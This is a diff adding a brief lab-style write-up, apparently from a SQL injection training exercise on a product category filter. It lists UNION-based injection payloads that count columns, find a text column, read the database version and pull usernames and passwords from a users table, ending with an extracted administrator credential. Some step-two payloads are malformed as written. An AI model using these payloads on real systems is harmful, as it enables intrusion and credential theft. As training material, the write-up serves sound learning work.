@@ -1,0 +1,42 @@
+SQL Injection Union Attack - Product category filter
+
+Main Goal :-- 
+
+Retrieve all username and passwords and use
+info to login as administrator
+
+Analysis:
+---------
+
+1> No of column 
+
+' order by 1--  -> not display anything on page
+' order by 2--  -> not display anayting on page
+' order by 3--  -> internal server error
+
+total column: 3-1=2
+
+2> find which column contain text because we need to print username and passwords
+which is type text
+
+' select 'a' NULL--
+' select NULL 'a'--
+
+
+3> Output data from other tables
+' UNION select NULL, username from users--
+' UNION select NULL, password from users--
+
+--In order to show username and password in one column we have to 
+concatinate two string, we have to find database we are using using 
+payload, bcz each database have seperate method for concatination
+
+To display db verison:
+' UNION select NULL, version() from users--
+
+Concatination query:
+' UNION select NULL, username || '-' || password from users--
+
+Result:
+administrator-mbm8ar6j1r28j3k879wu
+
